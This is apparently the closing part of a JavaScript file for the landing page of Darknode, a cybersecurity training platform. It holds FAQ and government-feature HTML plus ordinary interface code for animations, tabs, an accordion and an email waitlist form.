              <div class="faq-a-inner">Darknode supports 8 AI providers out of the box. For cloud models: Claude 3.5/4 (Anthropic), GPT-4o/o1 (OpenAI), Gemini 2.0 (Google), Mistral Large, and Cohere Command R+. For free local models: any Ollama-compatible model including Llama 3, Mixtral, CodeLlama, Phi-3, and Qwen. The Nexus AI agent can switch between providers mid-conversation, race multiple models against each other, or ensemble their answers for higher accuracy. You bring your own API key &mdash; Darknode never charges for AI tokens on any plan.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Is this legal to use?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. Darknode is an educational platform built for learning cybersecurity through hands-on practice. All practice labs and vulnerable environments run locally in Docker containers on your own machine &mdash; you're never testing external systems without authorization. The tools are the same ones used by professional security assessors and researchers worldwide (nmap, nuclei, Burp Suite, etc.). If you use Darknode to test real systems, always ensure you have explicit written authorization from the system owner. Unauthorized testing of systems you don't own is illegal regardless of the tools used.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">How is this different from Kali Linux?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Kali Linux gives you a collection of pre-installed tools. Darknode gives you those same tools plus an AI agent (Nexus) that explains what each tool does, generates the right commands for your target, walks you through methodologies step by step, and writes professional reports from your findings. Darknode also includes a built-in learning hub with 1,400+ cybersecurity topics, interactive quizzes, practice labs, CTF challenges, and real-time threat intelligence feeds. Think of Kali as the toolbox and Darknode as the toolbox plus a mentor who teaches you how to use every tool in it.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I use this for professional security assessments?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. Darknode includes professional-grade tools for real engagements: the Security Console for managing multi-phase assessments, automated scan profiles for reconnaissance, vulnerability scanning and verification, the AI-powered report writer that generates client-ready PDF reports, and the engagement tracker for managing findings across multiple targets. Many professional security consultants use Darknode alongside traditional tools like Burp Suite. Always operate within your engagement scope, follow your rules of engagement, and document everything.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">What are the system requirements?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">For the web platform (darknode.ai): any modern browser (Chrome, Firefox, Safari, Edge). For the CLI: Node.js 18+ on Windows, macOS, or Linux. For local AI models via Ollama: 16 GB RAM minimum (32 GB recommended for larger models). For practice labs: Docker installed and running. For Darknode OS (Custom Kernel): VirtualBox or QEMU with 128 MB RAM. For Darknode OS (Linux Edition): VirtualBox or VMware with 4 GB RAM and 40 GB disk space. The desktop app is available as .AppImage (Linux), .dmg (macOS), and .exe (Windows).</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">How do paid plans work?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Paid plans (coming soon) add professional features on top of the free platform. The core platform, all 164+ tools, and the CLI stay free forever. Pro and Team tiers unlock extras like automated scan scheduling, vulnerability tracking, AI report generation, and team collaboration.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I contribute or modify the code?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">The Darknode source code is publicly available on GitHub for transparency and learning purposes. You can read, study, and reference the code to understand how the platform works. However, copying, forking, redistribution, and commercial use are not permitted under the license. If you find a bug or have a feature request, please open an issue on GitHub &mdash; we actively review and respond to community feedback.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Where can I get help?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">There are several ways to get support. The Nexus AI agent has a built-in <code>/docs</code> command that covers every feature and tool on the platform. For bug reports and feature requests, open an issue on our GitHub repository. The AI assistant can answer most questions about how to use specific tools, interpret scan results, or follow security methodologies. For account-related issues, use the in-app feedback form. Pro and Team subscribers also get priority email and chat support.</div>
            </div>
          </div>

        </div>
      </div>
    </section>

    <!-- ====== GOVERNMENT & ENTERPRISE ====== -->
    <section class="section gov-section" id="government" aria-labelledby="gov-title">
      <div class="wrap">
        <div class="sec-label">Government &amp; Enterprise</div>
        <h2 class="sec-title" id="gov-title">Purpose-built for federal cyber defense</h2>
        <p class="sec-sub">Tools designed for SOC analysts, intelligence officers, and CISOs. From PDB-style briefings to NIST compliance mapping.</p>
        <div class="gov-grid">
          <div class="gov-card">
            <div class="gov-icon">[B]</div>
            <h3>Executive Cyber Briefing</h3>
            <p>Generate PDB-style intelligence reports with BLUF summaries, threat actor tracking, sector risk matrices, and classification banners.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[V]</div>
            <h3>Vulnerability Triage Engine</h3>
            <p>SSVC decision trees, CISA KEV integration, BOD 22-01 compliance tracking, and remediation SLA calculators for federal systems.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[$]</div>
            <h3>Incident Cost Calculator</h3>
            <p>IBM/Ponemon methodology breach cost modeling with sector multipliers, regulatory fine estimation, and insurance gap analysis.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[C]</div>
            <h3>Federal Compliance Mapper</h3>
            <p>Cross-walk NIST 800-53, CSF 2.0, FedRAMP, CMMC 2.0, FISMA, and HIPAA. Gap analysis with POA&amp;M generation and ATO checklists.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[A]</div>
            <h3>Adversary Playbook Builder</h3>
            <p>MITRE ATT&amp;CK emulation planning with detection coverage heatmaps, purple team exercise generation, and STIX 2.1 export.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[+]</div>
            <h3>5 More Coming</h3>
            <p>Architecture reviewer, election security toolkit, infrastructure dependency mapper, workforce planner, and sanctions analyzer.</p>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== CTA ====== -->
    <section class="cta-final">
      <div class="cta-mesh"></div>
      <div class="cta-grid-bg"></div>
      <div class="wrap cta-inner">
        <h2>Start learning security today.</h2>
        <p class="cta-sub">Free forever. 100% private. Runs entirely on your machine.</p>
        <button class="btn lg" id="cta-signup">Get started &rarr;</button>
        <div class="cta-divider"></div>
        <div class="cta-notify">
          <h3 class="cta-notify-h">Get notified when Pro launches</h3>
          <form class="cta-form" id="cta-notify-form" autocomplete="off">
            <input type="email" class="cta-email" id="cta-email" placeholder="you@example.com" required aria-label="Email address">
            <button type="submit" class="btn lg" id="cta-notify-btn">Notify me</button>
          </form>
          <p class="cta-reassure" id="cta-reassure">No spam. One email when we launch.</p>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="land-footer">
      <div class="wrap land-footer-inner">
        <div class="land-footer-left">
          <span class="land-footer-brand">Darknode</span>
          <p style="font-size:.72rem;color:inherit;opacity:.5;margin:0 0 4px">Cybersecurity education platform for students and professionals. All tools are for authorized educational use only.</p>
          <span class="land-footer-copy">&copy; 2026 Darknode-Official. All rights reserved.</span>
        </div>
        <div class="land-footer-links">
          <a href="${GITHUB}" target="_blank" rel="noopener">GitHub</a>
          <a href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">CLI</a>
          <a href="${GITHUB}/darknode-os" target="_blank" rel="noopener">OS</a>
          <a href="${GITHUB}/nexus" target="_blank" rel="noopener">Nexus</a>
          <a href="/faq" data-nav="section" data-section="faq">FAQ</a>
        </div>
      </div>
    </footer>

    <!-- Back to top -->
    <button class="btt" id="btt" aria-label="Back to top" title="Back to top">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="18 15 12 9 6 15"/></svg>
    </button>`;

  const $ = (id) => view.querySelector("#" + id);
  $("cta-start").onclick = actions.onGetStarted;
  $("cta-signup").onclick = actions.onGetStarted;
  if ($("price-free")) $("price-free").onclick = actions.onGetStarted;
  const scrollToCta = () => { const el = view.querySelector(".cta-notify"); if (el) el.scrollIntoView({ behavior: "smooth", block: "center" }); };
  if ($("price-pro")) $("price-pro").onclick = scrollToCta;
  if ($("price-team")) $("price-team").onclick = scrollToCta;
  if ($("price-enterprise")) $("price-enterprise").onclick = scrollToCta;

  // Billing toggle (monthly ↔ annual)
  const billSwitch = $("billing-switch");
  if (billSwitch) {
    billSwitch.onclick = function() {
      const grid = $("pricing-grid");
      const isAnnual = billSwitch.classList.toggle("annual");
      grid.classList.toggle("billing-annual", isAnnual);
      var mLabel = $("bill-monthly"), aLabel = $("bill-annual");
      if (mLabel) mLabel.classList.toggle("active", !isAnnual);
      if (aLabel) aLabel.classList.toggle("active", isAnnual);
    };
  }

  // Animated counter for hero stats — scroll-triggered with easing
  const counterEls = view.querySelectorAll("[data-count]");
  function formatNum(n, fmt) { return fmt === "comma" ? n.toLocaleString("en-US") : String(n); }
  function animateCounter(el) {
    if (el._counted) return;
    el._counted = true;
    const target = parseInt(el.dataset.count);
    const suffix = el.dataset.suffix || "";
    const fmt = el.dataset.format || "";
    const duration = 1500;
    const start = performance.now();
    function tick(now) {
      const t = Math.min((now - start) / duration, 1);
      const ease = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = Math.round(ease * target);
      el.textContent = formatNum(current, fmt) + suffix;
      if (t < 1) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
  }
  if ("IntersectionObserver" in window) {
    const trustWrap = view.querySelector('.hero-trust');
    if (trustWrap) {
      const trustIO = new IntersectionObserver((entries) => {
        entries.forEach(e => { if (e.isIntersecting) { counterEls.forEach(el => animateCounter(el)); trustIO.disconnect(); } });
      }, { threshold: 0.1 });
      trustIO.observe(trustWrap);
    } else {
      counterEls.forEach(el => animateCounter(el));
    }
  } else {
    counterEls.forEach(el => animateCounter(el));
  }

  // Hero text rotation
  const words = ["cybersecurity", "security research", "defense training", "threat analysis", "security operations"];
  let wordIdx = 0;
  const rotateEl = $("hero-rotate");
  if (rotateEl) {
    const wrap = rotateEl.parentElement;
    if (wrap) {
      let maxW = 0;
      const orig = rotateEl.textContent;
      for (const w of words) { rotateEl.textContent = w; maxW = Math.max(maxW, rotateEl.offsetWidth); }
      rotateEl.textContent = orig;
      wrap.style.minWidth = maxW + "px";
    }
    setInterval(() => {
      wordIdx = (wordIdx + 1) % words.length;
      rotateEl.style.opacity = "0";
      rotateEl.style.transform = "translateY(-8px)";
      setTimeout(() => {
        rotateEl.style.transition = "none";
        rotateEl.style.transform = "translateY(8px)";
        rotateEl.textContent = words[wordIdx];
        requestAnimationFrame(() => {
          rotateEl.style.transition = "opacity .25s,transform .25s";
          rotateEl.style.opacity = "1";
          rotateEl.style.transform = "translateY(0)";
        });
      }, 250);
    }, 3000);
  }

  // Scroll reveal -- staggered section-level reveal for premium cascading feel.
  // When a section scrolls into view, all its reveal-target children fade in
  // with incremental delays (each child +0.07s after the previous, capped at 0.42s).
  if ("IntersectionObserver" in window) {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    const REVEAL_SEL = ".sec-label,.sec-title,.sec-sub,.bento-card,.price-card,.feature-row,.tlv-step,.nx-card,.gh-card,.pricing-note,.nx-details,.hero-trust,.hero-built-with,.testimonial-card,.faq-item,.cmp-landing,.ts-card,.ts-tabs,.nx-arch-layer,.nx-hl,.nx-arch,.metric-card,.rag-tabs,.rag-card,.showcase-tabs,.showcase-window,.showcase-hint,.plab-card,.plab-note,.os-card,.os-boot-preview";
    if (!reduce) {
      const sectionIO = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (!entry.isIntersecting) return;
          sectionIO.unobserve(entry.target);
          const children = entry.target.querySelectorAll(REVEAL_SEL);
          children.forEach((child, i) => {
            child.style.transitionDelay = Math.min(i * 0.07, 0.42) + "s";
          });
          // rAF ensures transition-delay is applied before class triggers transition
          requestAnimationFrame(() => {
            children.forEach(child => child.classList.add("revealed"));
            // cta-final itself is a reveal target (no children in REVEAL_SEL)
            if (entry.target.matches(".cta-final")) {
              entry.target.classList.add("revealed");
            }
          });
        });
      }, { threshold: 0.08, rootMargin: "0px 0px -40px 0px" });
      view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => sectionIO.observe(sec));
      // Fallback: reveal anything already visible, and reveal all after 3s max
      setTimeout(() => { const wh = window.innerHeight + 200; const els = [...view.querySelectorAll(REVEAL_SEL)]; const tops = els.map(el => el.getBoundingClientRect().top); els.forEach((el, i) => { if (tops[i] < wh) el.classList.add("revealed"); }); }, 300);
      setTimeout(() => { view.querySelectorAll(REVEAL_SEL).forEach(el => el.classList.add("revealed")); }, 3000);
    } else {
      // Reduced motion: make everything visible immediately, no transitions
      view.querySelectorAll(REVEAL_SEL + ",.cta-final").forEach(el => el.classList.add("revealed"));
    }
  }

  // Parallax gradient shift on .section.alt backgrounds
  (function() {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    if (reduce) return;
    const altSections = view.querySelectorAll(".section.alt");
    if (!altSections.length) return;
    let ticking = false;
    function updateParallax() {
      const vh = window.innerHeight;
      altSections.forEach(function(sec) {
        const rect = sec.getBoundingClientRect();
        const progress = (vh - rect.top) / (vh + rect.height);
        const clamped = Math.max(0, Math.min(1, progress));
        const x = (clamped - 0.5) * 80;
        const y = (clamped - 0.5) * 60;
        sec.style.setProperty("--px-x", x + "px");
        sec.style.setProperty("--px-y", y + "px");
      });
      ticking = false;
    }
    window.addEventListener("scroll", function() {
      if (!ticking) { ticking = true; requestAnimationFrame(updateParallax); }
    }, { passive: true });
    updateParallax();
  })();

  // Smooth scroll for anchor links within the landing page
  view.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener("click", (e) => {
      const href = link.getAttribute("href");
      if (!href || href === "#") return;
      const target = view.querySelector(href);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    });
  });

  // Keyboard accessibility: make pricing cards focusable
  view.querySelectorAll(".bento-card, .nx-card, .gh-card").forEach(el => {
    if (!el.getAttribute("tabindex") && !el.closest("a")) {
      el.setAttribute("tabindex", "0");
    }
  });

  // FAQ accordion
  view.querySelectorAll(".faq-q").forEach(btn => {
    btn.addEventListener("click", () => {
      const item = btn.closest(".faq-item");
      const panel = item.querySelector(".faq-a");
      const toggle = btn.querySelector(".faq-toggle");
      const isOpen = item.classList.contains("open");

      if (isOpen) {
        // Collapse: animate from current height to 0
        panel.style.maxHeight = panel.scrollHeight + "px";
        requestAnimationFrame(() => {
          panel.style.maxHeight = "0";
        });
        item.classList.remove("open");
        btn.setAttribute("aria-expanded", "false");
        toggle.textContent = "+";
        panel.addEventListener("transitionend", function handler() {
          panel.hidden = true;
          panel.removeEventListener("transitionend", handler);
        });
      } else {
        // Expand: reveal then animate from 0 to scrollHeight
        panel.hidden = false;
        panel.style.maxHeight = "0";
        requestAnimationFrame(() => {
          panel.style.maxHeight = panel.scrollHeight + "px";
        });
        item.classList.add("open");
        btn.setAttribute("aria-expanded", "true");
        toggle.textContent = "−";
        panel.addEventListener("transitionend", function handler() {
          panel.style.maxHeight = "none";
          panel.removeEventListener("transitionend", handler);
        });
      }
    });
  });

  // Tool showcase: category filter tabs
  const tsTabs = view.querySelectorAll(".ts-tab");
  const tsCards = view.querySelectorAll(".ts-card");
  tsTabs.forEach(tab => {
    tab.addEventListener("click", () => {
      tsTabs.forEach(t => { t.classList.remove("on"); t.setAttribute("aria-selected", "false"); });
      tab.classList.add("on");
      tab.setAttribute("aria-selected", "true");
      const cat = tab.dataset.cat;
      tsCards.forEach(card => {
        if (cat === "all" || card.dataset.cat === cat) {
          card.style.display = "";
          card.classList.add("revealed");
        } else {
          card.style.display = "none";
        }
      });
    });
  });

  // Tool showcase: "View all 164+ tools" links to the tools section in the app
  const tsViewAll = $("ts-view-all");
  if (tsViewAll) {
    tsViewAll.addEventListener("click", (e) => {
      e.preventDefault();
      if (actions.onGetStarted) actions.onGetStarted();
    });
  }

  // Showcase tabs: "See it in action" tabbed terminal demo
  const showcaseTabs = view.querySelectorAll(".showcase-tab");
  const showcasePanels = view.querySelectorAll(".showcase-panel");
  const showcaseDots = view.querySelectorAll(".showcase-dot");
  const showcaseTitles = { recon: "darknode", analysis: "nexus", exploit: "nexus", report: "darknode" };
  const showcaseTitleEl = view.querySelector("#showcase-tw-title");

  function switchShowcaseTab(tabName) {
    showcaseTabs.forEach(t => {
      const active = t.dataset.tab === tabName;
      t.classList.toggle("active", active);
      t.setAttribute("aria-selected", active ? "true" : "false");
    });
    showcasePanels.forEach(p => {
      const id = p.id.replace("stab-", "");
      if (id === tabName) {
        p.hidden = false;
        p.classList.add("showcase-panel-in");
      } else {
        p.hidden = true;
        p.classList.remove("showcase-panel-in");
      }
    });
    showcaseDots.forEach(d => d.classList.toggle("active", d.dataset.tab === tabName));
    if (showcaseTitleEl) showcaseTitleEl.textContent = showcaseTitles[tabName] || "darknode";
  }

  showcaseTabs.forEach(tab => {
    tab.addEventListener("click", () => switchShowcaseTab(tab.dataset.tab));
  });
  showcaseDots.forEach(dot => {
    dot.addEventListener("click", () => switchShowcaseTab(dot.dataset.tab));
  });

  // Keyboard navigation for showcase tabs (left/right arrows)
  showcaseTabs.forEach(tab => {
    tab.addEventListener("keydown", (e) => {
      const tabList = Array.from(showcaseTabs);
      const idx = tabList.indexOf(tab);
      let next = -1;
      if (e.key === "ArrowRight") next = (idx + 1) % tabList.length;
      else if (e.key === "ArrowLeft") next = (idx - 1 + tabList.length) % tabList.length;
      if (next >= 0) {
        e.preventDefault();
        tabList[next].focus();
        switchShowcaseTab(tabList[next].dataset.tab);
      }
    });
  });

  // Security Knowledge RAG tabs
  const ragTabs = view.querySelectorAll(".rag-tab");
  const ragPanels = view.querySelectorAll(".rag-panel");
  ragTabs.forEach(tab => {
    tab.addEventListener("click", () => {
      const target = tab.dataset.rag;
      ragTabs.forEach(t => {
        const active = t.dataset.rag === target;
        t.classList.toggle("active", active);
        t.setAttribute("aria-selected", active ? "true" : "false");
      });
      ragPanels.forEach(p => {
        const active = p.dataset.ragPanel === target;
        p.classList.toggle("active", active);
        if (active) {
          // Re-trigger reveal on newly visible cards
          p.querySelectorAll(".rag-card").forEach(c => c.classList.add("revealed"));
        }
      });
    });
    // Keyboard navigation for RAG tabs (left/right arrows)
    tab.addEventListener("keydown", (e) => {
      const tabList = Array.from(ragTabs);
      const idx = tabList.indexOf(tab);
      let next = -1;
      if (e.key === "ArrowRight") next = (idx + 1) % tabList.length;
      else if (e.key === "ArrowLeft") next = (idx - 1 + tabList.length) % tabList.length;
      if (next >= 0) {
        e.preventDefault();
        tabList[next].focus();
        tabList[next].click();
      }
    });
  });

  // Newsletter signup — store email in Firestore "waitlist" collection
  const notifyForm = $("cta-notify-form");
  const notifyEmail = $("cta-email");
  const notifyBtn = $("cta-notify-btn");
  const notifyMsg = $("cta-reassure");
  if (notifyForm) {
    notifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = (notifyEmail.value || "").trim().toLowerCase();
      if (!email) return;
      notifyBtn.disabled = true;
      notifyBtn.textContent = "Sending...";
      try {
        await addDoc(collection(db, "waitlist"), {
          email,
          source: "landing-cta",
          createdAt: serverTimestamp()
        });
        notifyMsg.textContent = "You are on the list. We will email you when Pro launches.";
        notifyMsg.classList.add("cta-reassure-ok");
        notifyEmail.value = "";
        notifyBtn.textContent = "Done";
      } catch (err) {
        notifyMsg.textContent = "Something went wrong. Please try again.";
        notifyMsg.classList.add("cta-reassure-err");
        notifyBtn.disabled = false;
        notifyBtn.textContent = "Notify me";
      }
    });
  }

  // Back to top button — show after scrolling down 600px
  const bttBtn = $("btt");
  if (bttBtn) {
    let bttVisible = false;
    const toggleBtt = () => {
      const scrolled = window.scrollY > 600;
      if (scrolled !== bttVisible) {
        bttVisible = scrolled;
        bttBtn.classList.toggle("btt-show", scrolled);
      }
    };
    window.addEventListener("scroll", toggleBtt, { passive: true });
    toggleBtt();
    bttBtn.addEventListener("click", () => {
      window.scrollTo({ top: 0, behavior: "smooth" });
    });
  }

  // Handle footer and in-page section links
  view.querySelectorAll("a[data-nav='section']").forEach(link => {
    link.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = link.getAttribute("href");
    });
  });

  // Dedicated page routing — show only the target section at /faq, /pricing, etc.
  const PAGE_ROUTES = { "/pricing": "pricing", "/faq": "faq", "/features": "features", "/darknode-os": "darknode-os" };
  const PAGE_TITLES = { "/pricing": "Pricing", "/faq": "FAQ", "/features": "Features", "/darknode-os": "Darknode OS" };
  const dedicatedId = PAGE_ROUTES[location.pathname];
  if (dedicatedId) {
    view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => {
      if (sec.id !== dedicatedId) sec.hidden = true;
    });
    const target = view.querySelector("#" + dedicatedId);
    if (target) {
      const back = document.createElement("div");
      back.className = "dedicated-page-header";
      back.innerHTML = '<a class="dedicated-back" href="/"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg> Back to home</a>';
      back.querySelector("a").addEventListener("click", (e) => { e.preventDefault(); window.location.href = "/"; });
      target.insertAdjacentElement("beforebegin", back);
    }
    document.title = (PAGE_TITLES[location.pathname] || "Darknode") + " — Darknode";
    window.scrollTo(0, 0);
  }
}
